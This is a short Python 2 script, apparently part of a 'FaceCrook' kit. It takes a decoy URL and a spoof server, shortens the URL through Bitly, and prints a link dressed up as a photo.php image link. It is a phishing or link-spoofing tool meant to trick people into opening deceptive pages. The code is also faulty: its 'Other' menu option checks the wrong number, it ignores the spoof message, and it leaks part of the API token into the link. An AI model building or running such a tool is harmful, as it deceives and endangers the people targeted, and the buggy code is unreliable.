import json, urllib3

print
url = raw_input("Enter Decoy URL: ")

print
print "   ----- Spoof Servers -----   "
print
print " 1. http://localhost/FaceCrook/"
print " 2. Other"
print
server = raw_input("Enter Spoof Server (Default: 1): ")
if server == "1": server = "http://localhost/FaceCrook/"
elif server == "3": server = raw_input("Enter Spoof Server (e.g. https://some.server.com/): ")
else: server = "http://localhost/FaceCrook/"
msg = raw_input("\nEnter Spoof Message:\n\n\t")

## Bitly API ###
AccessToken = "YOUR BITLY API KEY"
BitlyURL = "https://api-ssl.bitly.com/v3/shorten?access_token=%s&longUrl=%s" % (AccessToken, url)
RequestURL = urllib3.PoolManager().request("GET", BitlyURL).data.decode("UTF-8")
BitlyJSON = json.loads(RequestURL)
scramble = AccessToken[::1][:36]
print "%sphoto.php?hashID=%s&img=%s.jpg" % (server, BitlyJSON["data"]["hash"], scramble)
